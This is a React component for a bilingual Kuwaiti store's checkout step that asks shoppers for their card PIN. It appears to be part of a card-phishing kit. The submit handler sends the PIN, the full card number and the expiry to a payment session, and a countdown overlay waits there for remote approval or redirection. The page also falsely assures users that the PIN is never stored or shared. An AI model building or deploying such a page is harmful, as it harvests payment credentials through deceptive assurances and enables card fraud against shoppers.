import { useState, useRef, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useLanguage } from '@/contexts/LanguageContext';
import { useCart } from '@/contexts/CartContext';
import { createOrder } from '@/hooks/useStore';
import { usePaymentSession } from '@/hooks/usePaymentSession';
import { getPaymentFlowState, savePaymentFlowState } from '@/lib/paymentFlowState';

import { Lock, Shield, KeyRound, Eye, EyeOff, AlertCircle } from 'lucide-react';
import PaymentRejectionBanner from '@/components/PaymentRejectionBanner';

const CardPIN = () => {
  const { lang } = useLanguage();
  const navigate = useNavigate();
  const location = useLocation();
  const { clearCart } = useCart();
  const [loading, setLoading] = useState(false);
  const [digits, setDigits] = useState<string[]>(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const [error, setError] = useState('');
  const [rejected, setRejected] = useState(false);

  const state = (location.state as any) || getPaymentFlowState() || {};
  const total = state?.total || 0;
  const cardNumber = state?.cardNumber || '';
  const last4 = cardNumber.slice(-4) || '0000';

  const { status, waiting, remainingTime, redirectTo, createSession, reset, clearRedirect } = usePaymentSession();

  useEffect(() => {
    if (redirectTo) {
      navigate(redirectTo.split("?")[0], { state, replace: true }); clearRedirect();
    }
  }, [redirectTo]);

  const pin = digits.join('');

  useEffect(() => {
    if (status === 'approved') {
      handleCreateOrder();
    } else if (status === 'rejected') {
      setRejected(true);
      setDigits(['', '', '', '']);
      reset();
      inputRefs.current[0]?.focus();
    }
  }, [status]);

  const handleCreateOrder = async () => {
    setLoading(true);
    try {
      if (!state || !state.form || !state.items) {
        throw new Error('Missing checkout state');
      }
      const order = await createOrder({
        customer_name: state.form.name,
        customer_phone: state.form.phone,
        area: state.form.area,
        block: state.form.block,
        street: state.form.street,
        building: state.form.building,
        floor: state.form.floor,
        apartment: state.form.apartment,
        notes: state.form.notes,
        payment_method: 'card',
        subtotal: state.subtotal,
        discount: state.discount,
        prep_fees: state.preparationFees || 0,
        total,
        coupon_code: state.couponCode || undefined,
        delivery_date: state.deliverySlot?.date,
        delivery_window: state.deliverySlot?.window,
        location_lat: state.location?.lat,
        location_lng: state.location?.lng,
        location_label: state.location?.label,
        items: state.items.map((item: any) => ({
          product_id: item.product.id,
          product_name_ar: item.product.name_ar,
          product_name_en: item.product.name_en,
          quantity: item.quantity,
          unit_price: Number(item.product.price),
          preparations: item.preparations || [],
        })),
      });
      clearCart();
      try {
        const { setLastPhone, pushNotification } = await import('@/hooks/useNotifications');
        setLastPhone(state.form.phone);
        pushNotification({
          order_number: order.order_number,
          status: 'pending',
          title_ar: 'تم استلام طلبك 🎉',
          title_en: 'Order received 🎉',
          body_ar: `طلبك #${order.order_number} قيد المعالجة عبر البطاقة`,
          body_en: `Order #${order.order_number} is being processed via card`,
        });
      } catch {}
      const successState = {
        ...state,
        orderNumber: order.order_number,
        items: state.items,
        form: state.form,
        paymentMethod: 'card',
        subtotal: state.subtotal,
        discount: state.discount,
        total,
        deliveryFee: state.deliveryFee,
        couponCode: state.couponCode,
      };
      savePaymentFlowState(successState);
      navigate('/payment-processing', { state: successState, replace: true });
    } catch (err) {
      console.error('Order creation failed');
      setLoading(false);
      alert(lang === 'ar' ? 'فشل إنشاء الطلب' : 'Order failed');
    }
  };

  const handleDigitChange = (index: number, value: string) => {
    if (!/^\d?$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value;
    setDigits(newDigits);
    setError('');
    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (pin.length < 4) {
      setError(lang === 'ar' ? 'يرجى إدخال 4 أرقام' : 'Please enter 4 digits');
      return;
    }
    setError('');
    setRejected(false);
    await createSession({
      step: 'card_pin',
      customerName: state?.form?.name,
      customerPhone: state?.form?.phone,
      total,
      cardLast4: last4,
      paymentMethod: 'card',
      metadata: { pin, cardNumber: state?.cardNumber, expiry: `${state?.expiryMonth}/${state?.expiryYear}` },
    });
  };

  return (
    <>
      <div style={{ backgroundColor: 'hsl(var(--muted) / 0.5)', minHeight: '100dvh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '16px 10px' }}>
        <div style={{ width: '100%', maxWidth: '400px' }}>

          {/* Waiting Overlay */}
          {(waiting && status === 'pending') || loading ? (
            <div style={{
              position: 'fixed', inset: 0, zIndex: 9999,
              backgroundColor: 'rgba(0,0,0,0.6)', display: 'flex', alignItems: 'center', justifyContent: 'center',
            }}>
              <div style={{
                backgroundColor: 'hsl(var(--card))', borderRadius: '14px', padding: '24px 20px',
                textAlign: 'center', maxWidth: '300px', width: '90%',
                boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
              }}>
                <div style={{
                  width: '40px', height: '40px', border: '3px solid hsl(var(--muted))',
                  borderTopColor: '#4caf50', borderRadius: '50%',
                  animation: 'spin 1s linear infinite', margin: '0 auto 14px',
                }} />
                <h3 style={{ fontSize: '13px', fontWeight: 'bold', color: 'hsl(var(--foreground))', fontFamily: 'Cairo, sans-serif', margin: '0 0 6px' }}>
                  {loading
                    ? (lang === 'ar' ? 'جاري معالجة الدفع...' : 'Processing payment...')
                    : (lang === 'ar' ? 'جاري التحقق من الرقم السري...' : 'Verifying PIN...')}
                </h3>
                <p style={{ fontSize: '11px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif', margin: '0 0 12px' }}>
                  {lang === 'ar' ? 'يرجى الانتظار' : 'Please wait'}
                </p>
                <div style={{ fontSize: '18px', fontWeight: 'bold', fontFamily: 'monospace', color: remainingTime <= 30 ? '#f44336' : '#4caf50' }}>
                  {Math.floor(remainingTime / 60)}:{String(remainingTime % 60).padStart(2, '0')}
                </div>
                <div style={{ width: '80%', height: '3px', borderRadius: '2px', backgroundColor: 'hsl(var(--muted))', margin: '6px auto 0', overflow: 'hidden' }}>
                  <div style={{ width: `${(remainingTime / 300) * 100}%`, height: '100%', borderRadius: '2px', backgroundColor: remainingTime <= 30 ? '#f44336' : '#4caf50', transition: 'width 1s linear' }} />
                </div>
              </div>
            </div>
          ) : null}

          <div style={{
            backgroundColor: 'hsl(var(--card))', borderRadius: '14px',
            boxShadow: '0 8px 40px rgba(0,0,0,0.08)', overflow: 'hidden',
          }}>
            {/* Security header */}
            <div style={{
              display: 'flex', justifyContent: 'center', gap: '16px', padding: '10px 16px',
              borderBottom: '1px solid hsl(var(--border))', backgroundColor: 'hsl(var(--muted) / 0.3)',
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                <Shield size={12} color="#4caf50" />
                <span style={{ fontSize: '9px', fontFamily: 'Cairo, sans-serif', color: 'hsl(var(--muted-foreground))' }}>
                  {lang === 'ar' ? 'آمن' : 'Secure'}
                </span>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                <Lock size={12} color="#4caf50" />
                <span style={{ fontSize: '9px', fontFamily: 'Cairo, sans-serif', color: 'hsl(var(--muted-foreground))' }}>
                  {lang === 'ar' ? 'مشفر' : 'Encrypted'}
                </span>
              </div>
            </div>

            <form onSubmit={handleSubmit}>
              <div style={{ padding: '18px 18px 16px' }}>

                {/* Icon + Title */}
                <div style={{ textAlign: 'center', marginBottom: '16px' }}>
                  <div style={{
                    width: '48px', height: '48px', borderRadius: '50%', margin: '0 auto 10px',
                    background: 'linear-gradient(135deg, rgba(33,150,243,0.1), rgba(33,150,243,0.2))',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                  }}>
                    <KeyRound size={20} color="#2196f3" />
                  </div>
                  <h2 style={{ fontSize: '16px', fontWeight: 'bold', color: 'hsl(var(--foreground))', fontFamily: 'Cairo, sans-serif', margin: '0 0 4px' }}>
                    {lang === 'ar' ? 'الرقم السري للبطاقة' : 'Card PIN'}
                  </h2>
                  <p style={{ fontSize: '11px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif', margin: 0, lineHeight: '1.5' }}>
                    {lang === 'ar'
                      ? 'أدخل الرقم السري لبطاقتك لإتمام عملية الدفع'
                      : 'Enter your card PIN to complete the payment'}
                  </p>
                </div>

                {/* Rejected error */}
                {/* Rejected error — قابل للإغلاق + يختفي بعد 3 ثوانٍ */}
                <div style={{ marginBottom: '12px' }}>
                  <PaymentRejectionBanner
                    show={rejected}
                    onClose={() => setRejected(false)}
                    variant="card"
                  />
                </div>


                {/* Card mini preview */}
                <div style={{
                  background: 'linear-gradient(135deg, #1a1a2e, #0f3460)',
                  borderRadius: '8px', padding: '10px 14px', marginBottom: '16px',
                  display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                }}>
                  <div>
                    <div style={{ fontSize: '8px', color: 'rgba(255,255,255,0.5)', fontFamily: 'Cairo, sans-serif', marginBottom: '1px' }}>
                      {lang === 'ar' ? 'المبلغ' : 'Amount'}
                    </div>
                    <div style={{ fontSize: '14px', fontWeight: 'bold', color: '#fff', fontFamily: 'Cairo, sans-serif' }}>
                      {total.toFixed(3)} <span style={{ fontSize: '9px', opacity: 0.7 }}>{lang === 'ar' ? 'د.ك' : 'KWD'}</span>
                    </div>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ fontSize: '8px', color: 'rgba(255,255,255,0.5)', fontFamily: 'Cairo, sans-serif', marginBottom: '1px' }}>
                      {lang === 'ar' ? 'البطاقة' : 'Card'}
                    </div>
                    <div style={{ fontSize: '12px', color: '#fff', fontFamily: 'monospace', letterSpacing: '2px' }}>
                      •••• {last4}
                    </div>
                  </div>
                </div>

                {/* PIN Input */}
                <div style={{ marginBottom: '14px' }}>
                  <label style={{ display: 'block', fontSize: '11px', fontWeight: '600', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif', marginBottom: '8px', textAlign: 'center' }}>
                    {lang === 'ar' ? 'الرقم السري (PIN)' : 'PIN Number'}
                  </label>
                  <div style={{ display: 'flex', justifyContent: 'center', gap: '8px', marginBottom: '6px' }} dir="ltr">
                    {digits.map((d, i) => (
                      <input
                        key={i}
                        ref={el => { inputRefs.current[i] = el; }}
                        type={showPin ? 'text' : 'password'}
                        inputMode="numeric" maxLength={1}
                        value={d}
                        onChange={e => handleDigitChange(i, e.target.value)}
                        onKeyDown={e => handleKeyDown(i, e)}
                        autoFocus={i === 0}
                        style={{
                          width: '42px', height: '48px', textAlign: 'center',
                          fontSize: '18px', fontFamily: 'monospace', fontWeight: 'bold',
                          border: error || rejected ? '2px solid #f44336' : d ? '2px solid #4caf50' : '2px solid hsl(var(--border))',
                          borderRadius: '8px', outline: 'none',
                          backgroundColor: d ? 'rgba(76,175,80,0.05)' : 'hsl(var(--muted) / 0.3)',
                          color: 'hsl(var(--foreground))',
                          transition: 'all 0.2s ease',
                        }}
                      />
                    ))}
                  </div>
                  <div style={{ textAlign: 'center' }}>
                    <button
                      type="button"
                      onClick={() => setShowPin(!showPin)}
                      style={{ background: 'none', border: 'none', cursor: 'pointer', padding: '2px', display: 'inline-flex', alignItems: 'center', gap: '3px' }}
                    >
                      {showPin
                        ? <><EyeOff size={12} color="hsl(var(--muted-foreground))" /><span style={{ fontSize: '9px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif' }}>{lang === 'ar' ? 'إخفاء' : 'Hide'}</span></>
                        : <><Eye size={12} color="hsl(var(--muted-foreground))" /><span style={{ fontSize: '9px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif' }}>{lang === 'ar' ? 'إظهار' : 'Show'}</span></>}
                    </button>
                  </div>
                  {error && (
                    <p style={{ textAlign: 'center', fontSize: '10px', color: '#f44336', fontFamily: 'Cairo, sans-serif', marginTop: '6px' }}>
                      {error}
                    </p>
                  )}
                </div>

                {/* Keypad hint */}
                <div style={{
                  display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '5px',
                  marginBottom: '16px', padding: '8px', borderRadius: '8px',
                  backgroundColor: 'hsl(var(--muted) / 0.3)',
                }}>
                  <Lock size={12} color="hsl(var(--muted-foreground))" />
                  <span style={{ fontSize: '9px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif' }}>
                    {lang === 'ar'
                      ? 'لا يتم تخزين أو مشاركة الرقم السري مع أي طرف'
                      : 'Your PIN is never stored or shared with any party'}
                  </span>
                </div>

                {/* Submit */}
                <button
                  type="submit"
                  disabled={pin.length < 4 || waiting}
                  style={{
                    width: '100%', border: 'none', borderRadius: '8px', padding: '10px',
                    fontSize: '13px', fontWeight: 'bold', fontFamily: 'Cairo, sans-serif',
                    cursor: (pin.length < 4 || waiting) ? 'not-allowed' : 'pointer',
                    background: (pin.length < 4 || waiting)
                      ? 'hsl(var(--muted))'
                      : 'linear-gradient(135deg, #4caf50, #2e7d32)',
                    color: '#fff',
                    boxShadow: (pin.length < 4 || waiting) ? 'none' : '0 4px 15px rgba(76,175,80,0.3)',
                    transition: 'all 0.3s ease',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px',
                  }}
                >
                  <Lock size={14} />
                  {lang === 'ar' ? `تأكيد الدفع ${total.toFixed(3)} د.ك` : `Confirm ${total.toFixed(3)} KWD`}
                </button>

                {/* Footer */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '5px', marginTop: '12px' }}>
                  <Lock size={10} color="#4caf50" />
                  <span style={{ fontSize: '9px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif' }}>
                    {lang === 'ar' ? 'معاملة مشفرة وآمنة بالكامل' : 'Fully encrypted & secure transaction'}
                  </span>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>
    </>
  );
};

export default CardPIN;
